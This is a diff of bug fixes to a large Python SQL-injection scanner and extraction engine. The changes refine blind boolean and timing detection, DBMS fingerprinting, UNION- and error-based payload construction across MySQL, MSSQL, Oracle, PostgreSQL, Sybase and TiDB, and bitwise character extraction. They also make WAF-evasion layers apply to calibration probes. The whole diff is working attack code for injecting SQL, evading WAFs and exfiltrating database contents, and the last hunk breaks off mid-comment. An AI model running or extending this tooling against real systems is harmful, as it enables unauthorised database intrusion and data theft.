@@ -38764,7 +38764,8 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                     while _conf_attempts < 3:
                         if WAFBlockDiscriminator.is_waf_block(c_true) or WAFBlockDiscriminator.is_waf_block(c_false):
                             _conf_attempts += 1
-                            if _conf_attempts >= 3: _conf_success = True; break
+                            # BUG-1 FIX: WAF blocks all 3 retries → confirmation FAILED (was wrongly set True)
+                            if _conf_attempts >= 3: break
                             await asyncio.sleep(config.delay * 2)
                             if _SCAN_STOPPED[0]:  # BUG-A-FIX [Req 4]: stop before extra probe
                                 return None
@@ -43728,10 +43729,17 @@ def build_extraction_payload_from_confirmed(
     # Return "" to trigger the DBMS-aware fallback which uses the inline timing oracle
     # (built at extraction setup, line ~62215) to construct correct IF(cond,SLEEP(N),0).
     _up2 = upper_payload
+    # BUG-HIGH-3 FIX: Add technique parameter check — timing techniques (T, TH, HQ, BT)
+    # must ALWAYS use the inline timing oracle, never the similarity oracle.
+    # Previously only payload-pattern detection was used, missing IF()-wrapped payloads.
+    _is_timing_technique = technique.upper() in ("T", "TH", "HQ", "BT") if technique else False
     _is_timing_payload = (
+        _is_timing_technique or  # BUG-HIGH-3 FIX: technique-based routing takes precedence
         'WAITFOR' in _up2 or
-        ('SLEEP(' in _up2 and 'CASE WHEN' in _up2) or
-        ('PG_SLEEP(' in _up2 and 'CASE WHEN' in _up2) or
+        # BUG-HIGH-3 FIX: Add IF()-wrapped SLEEP patterns (MySQL timing: IF(cond,SLEEP(N),0)).
+        # Previously: ('SLEEP(' in _up2 and 'CASE WHEN' in _up2) missed IF() variants.
+        ('SLEEP(' in _up2 and ('CASE WHEN' in _up2 or 'IF(' in _up2)) or
+        ('PG_SLEEP(' in _up2 and ('CASE WHEN' in _up2 or 'IF(' in _up2)) or
         ('BENCHMARK(' in _up2 and 'IF(' not in _up2) or
         'DBMS_PIPE.RECEIVE_MESSAGE' in _up2 or
         # BUG-RANDOMBLOB-TEMPLATE FIX (Req 7/10): RANDOMBLOB/ZEROBLOB fire unconditionally.
@@ -45075,8 +45083,12 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
         _bec_bl_samples = baseline.get("samples", []) if isinstance(baseline, dict) else []
         if not _bec_bl_samples and isinstance(baseline, dict):
             try:
+                # BUG-MEDIUM-4 FIX: Strip trailing comment markers from original before
+                # sending the baseline request. Using raw `original` (e.g. "1-- -") sends
+                # an injection artifact as the "clean" baseline, poisoning mean_length.
+                _bec_original_clean = _re.sub(r'\s*(?:--\s*-?|-#|#)\s*$', '', original or '').rstrip()
                 _bec_ref_fp = await _send_injected(engine, method, url, data, data_fmt,
-                                                    result.param, original, tamper_chain)
+                                                    result.param, _bec_original_clean, tamper_chain)
                 # BUG-FIX #3: Comprehensive response validation before accessing attributes
                 if _validate_response(_bec_ref_fp, allow_empty=False, func_name="blind_extract_char_inner_baseline"):
                     baseline = dict(baseline)  # copy — do not mutate caller's dict
@@ -46272,20 +46284,47 @@ class DBMSFingerprinter:
             return result.dbms,version
         if result.technique=="U":
             return await self._union_fingerprint(result,method,url,data,data_fmt,original,tamper_chain)
-        for dbms_name,q,_ in self.PROBES:
-            qmap=DBMS_QUERIES.get(dbms_name,{})
+        # BUG-FP-001 FIX: Previous code ignored the per-PROBE regex and returned the
+        # first DBMS whose query yielded any printable character.  Since MySQL and
+        # MariaDB both use SELECT VERSION() and MySQL appears first in PROBES, MariaDB
+        # was ALWAYS identified as MySQL.  Fix: extract the full version string and
+        # validate it against the PROBE regex before accepting the DBMS label.
+        # Two-pass: first collect (dbms, version) for all probes that return a
+        # printable first char (cheap, 1 char/DBMS), then validate regex on full ver.
+        _fp_candidates = []
+        for dbms_name, q, pat in self.PROBES:
+            qmap = DBMS_QUERIES.get(dbms_name, {})
             if not qmap: continue
             try:
-                char_func=qmap["char_func"].format(query=q,pos=1)
-                first=await blind_extract_char(self.engine,self.config,qmap,char_func,
-                                               result,method,url,data,data_fmt,original,tamper_chain,baseline,
-                                               pos=1)  # BUG-V190-004-COMPLETE FIX: pos=1 (fingerprint always checks first char)
+                char_func = qmap["char_func"].format(query=q, pos=1)
+                first = await blind_extract_char(self.engine, self.config, qmap, char_func,
+                                                 result, method, url, data, data_fmt, original,
+                                                 tamper_chain, baseline, pos=1)
                 if first and first.isprintable():
-                    LOG.info(f"DBMS: {dbms_name}")
-                    version=await blind_extract_string(self.engine,self.config,qmap,q,
-                                                       result,method,url,data,data_fmt,original,tamper_chain,baseline)
-                    return dbms_name,version
-            except Exception: continue
+                    _fp_candidates.append((dbms_name, q, qmap, pat))
+            except Exception:
+                continue
+        for dbms_name, q, qmap, pat in _fp_candidates:
+            try:
+                version = await blind_extract_string(self.engine, self.config, qmap, q,
+                                                     result, method, url, data, data_fmt,
+                                                     original, tamper_chain, baseline)
+                if version and _re.search(pat, version, _re.I):
+                    LOG.info(f"DBMS confirmed: {dbms_name} ({version})")
+                    return dbms_name, version
+            except Exception:
+                continue
+        # Fallback: return first candidate without regex validation (better than Unknown)
+        for dbms_name, q, qmap, pat in _fp_candidates:
+            try:
+                version = await blind_extract_string(self.engine, self.config, qmap, q,
+                                                     result, method, url, data, data_fmt,
+                                                     original, tamper_chain, baseline)
+                if version:
+                    LOG.info(f"DBMS (no-regex fallback): {dbms_name} ({version})")
+                    return dbms_name, version
+            except Exception:
+                continue
         return "Unknown",""
 
     async def _union_fingerprint(self,result,method,url,data,data_fmt,original,tamper_chain)->Tuple[str,str]:
@@ -68787,8 +68826,11 @@ async def blind_extract_string_v5(
             try:
                 char_func = _bes5_char_func_tpl.format(query=sql_query, pos=pos)
             except (KeyError, ValueError):
+                # BUG-BLIND-V5-MSSQL-CHARFUNC FIX: SUBSTR is not valid T-SQL;
+                # MSSQL requires SUBSTRING. Use ASCII(SUBSTRING(...)) as the
+                # fallback since it works on PostgreSQL, Oracle, SQLite, and MSSQL.
                 char_func = queries.get(
-                    "char_func", "ASCII(SUBSTR(({query}),{pos},1))"
+                    "char_func", "ASCII(SUBSTRING(({query}),{pos},1))"
                 ).format(query=sql_query, pos=pos)
             c = await blind_extract_char(engine, config, queries, char_func,
                                          result, method, url, data, data_fmt,
@@ -77193,6 +77235,19 @@ class AdvancedDBMSFingerprinter:
         n      = result.union_columns if result.technique == "U" else 0
         col    = result.injectable_col
 
+        # BUG-AFP-002 FIX: Per-DBMS error-injection wrappers for non-UNION blind probing.
+        # The old code used EXTRACTVALUE(1,CONCAT(0x7e,...)) for ALL non-UNION techniques,
+        # which is MySQL-only. Testing Oracle/MSSQL/PG/SQLite functions via MySQL-only syntax
+        # always fails → hits=0 → each DBMS gets W_FUNC_REJECT penalty regardless of real DBMS.
+        # Fix: use the appropriate error-injection or blind-boolean wrapper per tested DBMS.
+        _afp_err_wrappers = {
+            "MySQL":      lambda e: f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({e}),0x7e))-- -",
+            "MariaDB":    lambda e: f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({e}),0x7e))-- -",
+            "MSSQL":      lambda e: f"' AND 1=CONVERT(int,({e}))-- ",
+            "PostgreSQL": lambda e: f"' AND 1=CAST(({e}) AS integer)-- -",
+            "Oracle":     lambda e: f"' AND UTL_INADDR.GET_HOST_ADDRESS(({e}))=1-- ",
+            # SQLite, DB2, others: use IS NOT NULL boolean (safe universal approach)
+        }
         for dbms, probes in self.UNIQUE_FUNCTIONS.items():
             hits = 0
             for expr, expected_pat in probes[:3]:
@@ -77202,8 +77257,19 @@ class AdvancedDBMSFingerprinter:
                         parts[col] = f"({expr})"
                         payload = f"' UNION SELECT {','.join(parts)}--"
                     else:
-                        # Error-based via EXTRACTVALUE
-                        payload = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))--"
+                        # BUG-AFP-002 FIX: Use DBMS-appropriate error injection wrapper.
+                        # EXTRACTVALUE is MySQL-only; using it for Oracle/MSSQL/PG/SQLite
+                        # always returns a MySQL-XPATH error (or nothing), making the
+                        # response indistinguishable from a real DBMS-function-not-found,
+                        # causing false penalties on non-MySQL DBMSes.
+                        _wrap = _afp_err_wrappers.get(dbms)
+                        if _wrap:
+                            payload = _wrap(expr)
+                        else:
+                            # Generic blind: check if function is accepted (no syntax error)
+                            # by seeing if the page stays similar to baseline when condition
+                            # IS NOT NULL (always true for non-null function results).
+                            payload = f"' AND ({expr}) IS NOT NULL-- -"
 
                     fp = await _send_injected(self.engine, method, url, data,
                                               data_fmt, result.param,
@@ -77216,7 +77282,15 @@ class AdvancedDBMSFingerprinter:
 
                     if re.search(expected_pat, resp, re.I):
                         hits += 1
-                    elif sim >= 0.85:
+                    elif sim >= 0.85 and _afp_err_wrappers.get(dbms) is None:
+                        # For blind IS-NOT-NULL probes: high similarity = function accepted
+                        # (no syntax error), which counts as a hit
+                        hits += 1
+                    elif sim < 0.85 and _afp_err_wrappers.get(dbms) is None:
+                        self._penalise(dbms, self.W_FUNC_REJECT * 0.5)
+                    elif sim >= 0.85 and _afp_err_wrappers.get(dbms) is not None:
+                        # For error-wrapper probes: high similarity = error NOT triggered
+                        # = function not present or syntax invalid → penalize
                         self._penalise(dbms, self.W_FUNC_REJECT * 0.5)
                 except Exception as _sqr_e:
                     LOG.debug("Suppressed in _probe_unique_functions: %s", _sqr_e)
@@ -78614,8 +78688,10 @@ class FastExtractionEngine:
 
         # DBMS-specific string separator literal (the column separator as a SQL literal)
         _sep_lit: str
-        if _ue_dbms in ("MySQL", "MariaDB"):
-            # MySQL: 0x hex string literal — the only DBMS where this is correct
+        if _ue_dbms in ("MySQL", "MariaDB", "TiDB"):
+            # MySQL/TiDB: 0x hex string literal — the only DBMSes where this is correct
+            # BUG-TIDB-UNION FIX: TiDB added here; in TiDB's MySQL-compat mode || is
+            # logical OR (returns 0/1), NOT string concatenation. Must use CONCAT().
             _sep_lit = "0x" + self.COL_SEPARATOR.encode().hex()
         elif _ue_dbms in ("MSSQL", "Sybase"):
             # MSSQL: N'...' unicode literal; avoid binary 0x literal for NVARCHAR concat
@@ -78649,13 +78725,15 @@ class FastExtractionEngine:
             # FIX-UNION-SINGLE-COL-TRAILING-SEP: Add BOTH leading AND trailing separator so
             # extraction logic can find the value between two separators, preventing HTML
             # contamination after the value. Multi-column branches already have trailing sep.
-            if _ue_dbms in ("MySQL", "MariaDB", ""):
+            if _ue_dbms in ("MySQL", "MariaDB", "TiDB", ""):
+                # BUG-TIDB-UNION FIX: TiDB must use CONCAT() like MySQL, not ||
                 concat_expr = f"CONCAT({_sep_lit},{sql_cols[0]},{_sep_lit})"
             elif _ue_dbms in ("MSSQL", "Sybase"):
                 concat_expr = f"{_sep_lit}+{sql_cols[0]}+{_sep_lit}"
             else:
                 concat_expr = f"{_sep_lit}||{sql_cols[0]}||{_sep_lit}"
-        elif _ue_dbms in ("MySQL", "MariaDB", ""):
+        elif _ue_dbms in ("MySQL", "MariaDB", "TiDB", ""):
+            # BUG-TIDB-UNION FIX: TiDB uses CONCAT() not ||
             # MySQL CONCAT() is variadic — safe to pass N arguments; leading sep prepended
             parts = [_sep_lit]
             for i, col in enumerate(sql_cols):
@@ -79031,7 +79109,9 @@ class FastExtractionEngine:
         # BUG-NEW-1,3,5,7,9 FIX: Comprehensive DBMS support for all major databases
         # Previously only MySQL, PostgreSQL, Oracle, SQLite, MSSQL had dedicated branches
         # Missing: Sybase, Firebird, DB2, ClickHouse, H2, Informix, SAP_HANA, Amazon Redshift
-        if dm in ("MySQL","MariaDB",""):_q=lambda c:f"`{c}`";_nl=lambda e:f"IFNULL(CAST({e} AS CHAR),0x4e554c4c)";_tb=lambda d,t:f"`{d}`.`{t}`";_ct=lambda p:f"CONCAT({','.join(p)})";_sl=lambda:f"CAST({shx} AS CHAR)"
+        # BUG-TIDB-UNION FIX: TiDB added to MySQL/MariaDB group — in TiDB || is logical OR,
+        # not string concatenation; must use CONCAT() like MySQL.
+        if dm in ("MySQL","MariaDB","TiDB",""):_q=lambda c:f"`{c}`";_nl=lambda e:f"IFNULL(CAST({e} AS CHAR),0x4e554c4c)";_tb=lambda d,t:f"`{d}`.`{t}`";_ct=lambda p:f"CONCAT({','.join(p)})";_sl=lambda:f"CAST({shx} AS CHAR)"
         elif dm=="MSSQL":_q=lambda c:f"[{c}]";_nl=lambda e:f"ISNULL(CAST({e} AS NVARCHAR(MAX)),'NULL')";_tb=lambda d,t:f"[{d}]..[{t}]";_ct=lambda p:"+".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
         elif dm in ("PostgreSQL","CockroachDB"):_q=lambda c:'"'+c+'"';_nl=lambda e:f"COALESCE(CAST({e} AS TEXT),'NULL')";_tb=lambda d,t:'"'+d+'"."'+t+'"';_ct=lambda p:"||".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
         elif dm=="Oracle":_q=lambda c:c;_nl=lambda e:f"NVL(TO_CHAR({e}),'NULL')";_tb=lambda d,t:(d+"."+t if d else t);_ct=lambda p:"||".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
@@ -79457,7 +79537,16 @@ class FastExtractionEngine:
             # guard converts NULL to 0; no string delimiters enter comparison contexts.
             len_func = f"COALESCE(CHAR_LENGTH(({sql_query})),0)"
         elif _dbms_for_len == "Sybase":
-            len_func = f"DATALENGTH(({sql_query}))"
+            # BUG-SYBASE-LENF FIX (HIGH): Three compounding issues in the original:
+            # 1. No ISNULL guard — DATALENGTH(NULL) = NULL → binary search converges to 0.
+            # 2. No TOP 1 — multi-row schema queries raise "subquery returned more than
+            #    one value" error → same 0-length outcome.
+            # 3. DATALENGTH returns byte count, not character count. For VARCHAR data this
+            #    is char-count on single-byte charsets; use CHAR_LENGTH if available or
+            #    wrap with CONVERT to VARCHAR to normalise to a single-byte representation.
+            # Fix: mirror the MSSQL pattern with Sybase-compatible syntax (VARCHAR(8000)
+            # max, no NVARCHAR(MAX) in Sybase ASE, TOP instead of MAX()).
+            len_func = f"ISNULL(DATALENGTH(CONVERT(VARCHAR(8000),(SELECT TOP 1 CONVERT(VARCHAR(8000),({sql_query}))))),0)"
         elif _dbms_for_len in ("Firebird",):
             # BUG-FIREBIRD-CDB-COALESCE FIX (HIGH): The previous branch was
             # `elif _dbms_for_len in ("PostgreSQL", "Firebird", "CockroachDB"):`
@@ -82319,6 +82408,13 @@ class BitwiseExtractor:
         # to return the same page (the condition is commented out → oracle always False).
         # Matches the strip done by _extract_int, blind_extract_char, and blind_extract_string.
         self._clean_original = _re.sub(r'\s*(?:--\s*-?|-#|#)\s*$', '', original or '').rstrip()
+        # BUG-BWE-001 FIX: Store polarity on self so _binary_search_fallback can use it.
+        # Previously _polarity_inverted was a local variable in extract_char() that never
+        # reached the fallback, causing the fallback to navigate backwards under inverted
+        # polarity (WAF blocks TRUE conditions) and return garbage Unicode codepoints.
+        # BUG-BWE-002 FIX: Calibration is now done ONCE per string in extract_string(),
+        # not per-character, eliminating 100+ extra HTTP requests per extraction.
+        self._polarity_inverted: bool = False
 
     @property
     def request_count(self) -> int:
@@ -82524,7 +82620,12 @@ class BitwiseExtractor:
                     hi = mid
                     continue
                 sim    = SimHasher.body_similarity(self._norm_sample, norm_b)
-                if sim > self.FALLBACK_THRESH:
+                # BUG-BWE-001 FIX: apply polarity inversion so fallback navigates
+                # in the correct direction when WAF blocks TRUE-condition probes.
+                # Normal polarity: sim > THRESH means oracle TRUE (char >= mid+1) → lo = mid+1.
+                # Inverted polarity: sim > THRESH means oracle FALSE (char < mid+1) → hi = mid.
+                _bsf_condition_true = (sim > self.FALLBACK_THRESH) != getattr(self, '_polarity_inverted', False)
+                if _bsf_condition_true:
                     lo = mid + 1
                 else:
                     hi = mid
@@ -82547,7 +82648,11 @@ class BitwiseExtractor:
         # silently dropping supplementary-plane chars.  Fix: use _hi_val so the guard
         # always matches the actual ceiling used by the search above.
         # Numeric safety: _hi_val is a plain integer guard, never inside SQL delimiters.
-        if 32 <= char_code <= _hi_val:  # BUG-BSF-CAP-65535 FIX: was <= 65535
+        # BUG-BWE-004 FIX: Accept all non-zero code points 1.._hi_val.
+        # The old guard `32 <= char_code <= _hi_val` silently dropped control
+        # characters 1-31 (tab=9, newline=10, CR=13, etc.) which legitimately
+        # appear in database values, returning None and causing blank characters.
+        if 1 <= char_code <= _hi_val:
             return chr(char_code)
         if char_code == 0:
             return None
@@ -82577,43 +82682,11 @@ class BitwiseExtractor:
                     return None  # treat unexpected exceptions same as _probe_bit all-retries-failed
 
         # BUG-V214-BITWISE-POLARITY FIX (HIGH, all 5 DBMSes, B/BH technique, all surfaces):
-        # BitwiseExtractor.extract_char compared each bit's sim score against a fixed
-        # threshold — `s > self._sim_thresh` → bit=1. This assumes "TRUE condition →
-        # high sim-to-baseline" (normal polarity). On CDN-cached empty baselines both
-        # the baseline and ALL probe responses can be cached empty pages, making all
-        # sims ≈ 1.0 → all bits=1 → char_code=255 → garbage for every character.
-        # Alternatively, if WAF blocks TRUE-condition probes (returning empty) while
-        # passing FALSE-condition probes (returning real page), polarity is reversed:
-        # TRUE → empty → sim HIGH vs empty baseline → wrong bit=1 when it should be 0.
-        # Fix: send two calibration probes (1=1 always-TRUE, 1=2 always-FALSE) before
-        # the real bit probes. If FALSE yields higher sim than TRUE, set _polarity_inverted
-        # and flip the threshold comparison. This mirrors the differential oracle used in
-        # detect_boolean() and _waf_aware_eval() where polarity is handled automatically.
-        _polarity_inverted = False
-        try:
-            async def _probe_bool_calibration(_cond_expr: str) -> Optional[float]:
-                _pc_probe = (self._det_tmpl.replace("[INFERENCE]", _cond_expr)
-                             if self._det_tmpl else
-                             f"{self._inj_prefix} AND {_cond_expr}-- -")
-                self._probe_count += 1
-                _pc_probe = apply_heavy_variation(_pc_probe, self._probe_count, data_fmt=self.data_fmt)
-                _pc_fp = await _send_injected(
-                    self.engine, self.method, self.url, self.data, self.data_fmt,
-                    self.result.param, self._clean_original + _pc_probe, self.tamper_chain)
-                if not _validate_response(_pc_fp, allow_empty=False, func_name="BitwiseExtractor.polarity"):
-                    return None
-                _pc_nb = _normalise_response_safe(_pc_fp, func_name="BitwiseExtractor.polarity", default=b"")
-                return SimHasher.body_similarity(self._norm_sample, _pc_nb) if _pc_nb else None
-            _sim_true_cal, _sim_false_cal = await asyncio.gather(
-                _probe_bool_calibration("1=1"), _probe_bool_calibration("1=2"))
-            if _sim_true_cal is not None and _sim_false_cal is not None:
-                _polarity_inverted = bool(_sim_false_cal > _sim_true_cal)
-                if _polarity_inverted:
-                    LOG.debug(
-                        f"BitwiseExtractor: reversed polarity (sim_true={_sim_true_cal:.3f}, "
-                        f"sim_false={_sim_false_cal:.3f}) — inverting bit assignment")
-        except Exception:
-            pass  # Keep normal polarity on any error; extraction may still succeed
+        # BUG-BWE-001/BWE-002 FIX: Polarity is now calibrated ONCE per string in
+        # extract_string() and stored as self._polarity_inverted. Using the instance
+        # attribute directly here eliminates redundant per-character calibration probes
+        # (previously 2 extra HTTP requests per character position).
+        _polarity_inverted = getattr(self, '_polarity_inverted', False)
 
         sims = await asyncio.gather(
             *[probe_bit_safe(b) for b in range(max_bits)],
@@ -82655,26 +82728,18 @@ class BitwiseExtractor:
         elif char_code >= 128:
             self._confirmed_ascii = False
 
-        if 32 <= char_code <= 255:
-            # BUG-BITWISEEXT-GAP-127-159 FIX: The original code had two separate ranges
-            # [32,126] and [160,255] with an explicit gap at 127-159. It returned "?" for
-            # code points in that range even when bitwise probes converged at high confidence.
-            # Code points 127 (DEL), 128-159 (Windows-1252 printable chars: €=128, ‚=130,
-            # ƒ=131, Š=138, Œ=140, ž=158, Ÿ=159 etc.) legitimately appear in SQL databases
-            # using Latin-1 or Windows-1252 collations (MySQL latin1, MSSQL CP1252, PG WIN1252).
-            # Returning "?" forced the entire extracted string to contain wrong characters for
-            # those code points on every extraction attempt. The fallback binary-search path
-            # in _binary_search_fallback already correctly handles 32-65535 — the gap only
-            # affected the high-confidence bitwise path. Fix: accept all [32, 255].
+        if 1 <= char_code <= 255:
+            # BUG-BITWISEEXT-GAP-127-159 FIX: Accept full [1,255] range.
+            # Code points 1-31 (control chars: tab=9, newline=10, CR=13) legitimately
+            # appear in database columns; returning "?" corrupted extracted strings.
+            # BUG-BWE-004 FIX: Previous code had `32 <= char_code <= 255` followed by
+            # `return "?"`, meaning control characters 1-31 always returned "?".
+            # Now they fall through to `chr(char_code)` like all other valid code points.
             #
             # BUG-BITWISEEXT-MSSQL-UNICODE FIX: For MSSQL/Sybase (UNICODE() returns 0-65535)
-            # and SQLite (UNICODE() returns 0-1114111), a char_code ≥ 128 might be the lower
-            # 8 bits of a code point > 255 (e.g. '€'=8364=0x20AC → lower byte=0xAC=172).
-            # The 8-bit probing gives HIGH confidence for the truncated result (all bit probes
-            # have deterministic True/False outcomes), so agg_conf never drops below MIN_CONF
-            # and the fallback never fires — the wrong character is returned silently.
-            # Fix: for MSSQL/Sybase/SQLite, if char_code ≥ 128, delegate to _binary_search_fallback
-            # which searches over the full [0, 65535] range and returns the correct code point.
+            # and SQLite/MySQL/MariaDB/PostgreSQL/Oracle (returns 0-1114111), char_code ≥ 128
+            # might be the lower 8 bits of a multi-byte code point (e.g. '€'=8364=0x20AC →
+            # lower byte=0xAC=172). Delegate to binary-search-fallback for those DBMSes.
             if dbms in ("MSSQL", "Sybase", "SQLite", "MySQL", "MariaDB", "PostgreSQL",
                         "Oracle", "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift") and char_code >= 128:
                 self._fallback_count += 1
@@ -82682,7 +82747,7 @@ class BitwiseExtractor:
             return chr(char_code)
         if char_code == 0:
             return None
-        return "?"
+        return None  # unreachable, char_code is always 0..255 from 8-bit reconstruction
 
     async def extract_string(self, sql_query: str, dbms: str,
                               max_len: int = 256) -> str:
@@ -82768,6 +82833,48 @@ class BitwiseExtractor:
 
         if length == 0:
             return ""
+
+        # BUG-BWE-001/BWE-002 FIX: Run polarity calibration ONCE per string (not per char).
+        # Two probes (1=1 always-TRUE, 1=2 always-FALSE) detect CDN/WAF polarity inversion.
+        # Result stored on self so extract_char() and _binary_search_fallback() both use it.
+        # BUG-BWE-003 FIX: Apply all three WAF evasion layers to calibration probes (was only
+        # apply_heavy_variation; missing _obfuscate_extraction_cond and apply_sql_noise caused
+        # calibration to be blocked by WAFs that passed real bit-probes → polarity wrong).
+        self._polarity_inverted = False
+        try:
+            async def _bwe_calib(_cond_expr: str) -> Optional[float]:
+                _pc_probe = (self._det_tmpl.replace("[INFERENCE]", _cond_expr)
+                             if self._det_tmpl else
+                             f"{self._inj_prefix} AND {_cond_expr}-- -")
+                self._probe_count += 1
+                _pc_probe = apply_heavy_variation(_pc_probe, self._probe_count, data_fmt=self.data_fmt)
+                # BUG-BWE-003 FIX: also apply the other two evasion layers
+                try:
+                    _pc_probe = _obfuscate_extraction_cond(_pc_probe, self.data_fmt)
+                except Exception:
+                    pass
+                try:
+                    _pc_probe = apply_sql_noise(_pc_probe, self._probe_count)
+                except Exception:
+                    pass
+                _pc_fp = await _send_injected(
+                    self.engine, self.method, self.url, self.data, self.data_fmt,
+                    self.result.param, self._clean_original + _pc_probe, self.tamper_chain)
+                if not _validate_response(_pc_fp, allow_empty=False, func_name="BitwiseExtractor.polarity_cal"):
+                    return None
+                _pc_nb = _normalise_response_safe(_pc_fp, func_name="BitwiseExtractor.polarity_cal", default=b"")
+                return SimHasher.body_similarity(self._norm_sample, _pc_nb) if _pc_nb else None
+            _sim_true_cal, _sim_false_cal = await asyncio.gather(
+                _bwe_calib("1=1"), _bwe_calib("1=2"))
+            if _sim_true_cal is not None and _sim_false_cal is not None:
+                self._polarity_inverted = bool(_sim_false_cal > _sim_true_cal)
+                if self._polarity_inverted:
+                    LOG.debug(
+                        f"[BitwiseExtractor] Inverted polarity detected "
+                        f"(sim_true={_sim_true_cal:.3f}, sim_false={_sim_false_cal:.3f}) "
+                        f"— activating oracle inversion for all {length} character positions")
+        except Exception:
+            pass  # Keep normal polarity on any error; extraction may still succeed
 
         bit_count = (7 if self._confirmed_ascii else 8)
         LOG.debug(f"BitwiseExtractor v17: length={length}, "
@@ -107204,13 +107311,17 @@ class TechniqueCascadeEngine:
                     # _d_pass = True on any AWS/Cloudflare/standard-web-app target, producing
                     # the same class of false positive as the server-timing BUG-5 fix.
                     _backend_headers = [
-                        # Timing / performance headers that REFLECT SQL execution time
-                        # (NOT server-timing/x-runtime which vary with general load)
-                        "x-response-time", "x-elapsed-time", "x-timing",
+                        # BUG-FP-5 FIX: Removed generic high-variance timing headers
+                        # (x-response-time, x-elapsed-time, x-timing, x-backend-time,
+                        # x-processing-time, x-server-time, x-request-duration,
+                        # x-page-speed, x-cache-time). These reflect server CPU/network
+                        # load per request and naturally differ between any two requests
+                        # regardless of SQL injection. A single change triggered
+                        # _security_diffs >= 1 → _d_pass = True → Check D FALSE POSITIVE
+                        # on nearly every target. Only keep headers that are specifically
+                        # SQL-related or structural (not general request timing).
                         "x-query-time", "x-db-query-time", "x-sql-query-count",
-                        "x-backend-time", "x-processing-time", "x-server-time",
-                        "x-request-duration", "x-page-speed", "x-cache-time",
-                        # Server / framework
+                        # Server / framework (static across requests, changes indicate injection)
                         "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
                         "x-generator", "x-engine",
                         # CMS / framework caches (change on cache-miss vs cache-hit)
@@ -107552,8 +107663,35 @@ class TechniqueCascadeEngine:
             #     be high; gated by Condition 2 to prevent error-page FP
             #   - Genuine boolean injection: det response ≠ baseline (Cond 2 ✓)
             #     AND DBMS-SQL probe produces same changed page (Cond 1 ✓)
-            _e_pass = (_e_direct_sim >= 0.80
-                       and _det_sim < (1.0 - max(_gap_threshold, 0.25)))
+            #
+            # BUG-FP-1 FIX: If the baseline couldn't be fetched (_bl_fetch_ok=False),
+            # _det_sim is computed against an empty/garbage baseline body, making Condition 2
+            # unreliable (SimHasher.body_similarity(b"", any_page) ≈ 0.5, which is always
+            # < 0.75, so Condition 2 passes spuriously). Force _e_pass=False when we have
+            # no real baseline to compare against.
+            #
+            # BUG-FP-10 FIX: When the application returns a server error (5xx) for ALL
+            # requests (both detection payload AND DBMS-SQL canary), the two error pages
+            # are structurally similar (_e_direct_sim high) even though NO SQL is executing.
+            # Guard against this by requiring that the DBMS-SQL canary probe is NOT itself
+            # a WAF block or server error (status 5xx). An error probe cannot prove SQL execution.
+            _e_canary_ok = True
+            _e_canary_status = 0
+            try:
+                _e_fp_for_status = _efp_num if (_e_ctx == "numeric") else _efp_str
+                _e_canary_status = _get_safe_status_code(_e_fp_for_status) if _e_fp_for_status else 0
+                if _e_canary_status >= 500:
+                    _e_canary_ok = False
+                elif _e_fp_for_status and WAFBlockDiscriminator.is_waf_block(_e_fp_for_status):
+                    _e_canary_ok = False
+            except Exception:
+                pass
+            _e_pass = (
+                _bl_fetch_ok                                              # BUG-FP-1: real baseline required
+                and _e_canary_ok                                          # BUG-FP-10: canary must not be error/WAF-block
+                and _e_direct_sim >= 0.80
+                and _det_sim < (1.0 - max(_gap_threshold, 0.25))
+            )
             _details["E"] = (f"direct_sim={_e_direct_sim:.3f} "
                              f"det_sim={_det_sim:.3f} ctx={_e_ctx}")
             print(f"[*]     Check E ({dbms} SQL/{_e_ctx}): "
@@ -122858,13 +122996,19 @@ class ScannerV14(ScannerV13):
                                                                 # Use responses from Check A
                                                                 _h_true = {k.lower(): v for k, v in (getattr(_pcv_fp_t, 'headers', {}) or {}).items()}
                                                                 _h_false = {k.lower(): v for k, v in (getattr(_pcv_fp_f, 'headers', {}) or {}).items()}
-                                                                # BUG-CHECK-D-INLINE-4HEADERS FIX: Expanded security/timing header list
+                                                                # BUG-FP-5 FIX (inline Check D): Removed x-response-time, x-elapsed-time,
+                                                                # x-timing, x-backend-time, x-processing-time — these vary with server load
+                                                                # per request, NOT with SQL injection, causing false-positive Check D on
+                                                                # every target. Mirrors the fix already applied to _post_confirm_verify_locked.
                                                                 _d_security_hdrs = [
-                                                                    "x-response-time", "x-elapsed-time", "x-timing",
-                                                                    "x-query-time", "x-db-query-time", "x-backend-time", "x-processing-time",
-                                                                    "x-powered-by", "x-aspnet-version", "x-generator", "x-engine",
+                                                                    "x-query-time", "x-db-query-time", "x-sql-query-count",
+                                                                    "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
+                                                                    "x-generator", "x-engine",
                                                                     "x-drupal-cache", "x-wp-cache", "x-cache-status", "x-cache-hits",
-                                                                    "x-debug", "x-sql",                                                                     "x-upstream", "x-backend", "x-pool",  # BUG-5 FIX: server-timing removed — moved to dynamic list
+                                                                    "x-rails-cache", "x-symfony-cache", "x-varnish-cache",
+                                                                    "x-debug", "x-sql",
+                                                                    "x-upstream", "x-backend", "x-datacenter", "x-pool",
+                                                                    "content-disposition",
                                                                 ]
                                                                 # BUG-5 FIX: server-timing excluded entirely — not in security OR dynamic list.
                                                                 # server-timing + content-length is a known CDN noise pair; both change every
@@ -133161,7 +133305,11 @@ class SideChannelExtractor:
                 return None
 
         _status = getattr(fp, "status_code", None)
-        _length = len(_safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else "")
+        # BUG-SCE-LENGTH-MISMATCH FIX: Calibration uses fp.text (library's decoded text,
+        # charset from Content-Type header), but evaluation previously used _safe_decode_body
+        # with hardcoded UTF-8. On ISO-8859-1 servers the byte counts diverge, corrupting
+        # the nearest-neighbor oracle. Use fp.text in both paths for consistency.
+        _length = len(getattr(fp, "text", "") or "" if fp else "")
 
         if self._signal_type == "status":
             if _status == self._err_status:
@@ -133182,11 +133330,25 @@ class SideChannelExtractor:
             d_ok = abs(_length - self._ok_len)
             return d_err < d_ok
         elif self._signal_type == "header":
-            # Compare the specific header that was identified as differentiator
+            # BUG-SCE-HEADER-EXACT-MATCH FIX: Previously used exact equality
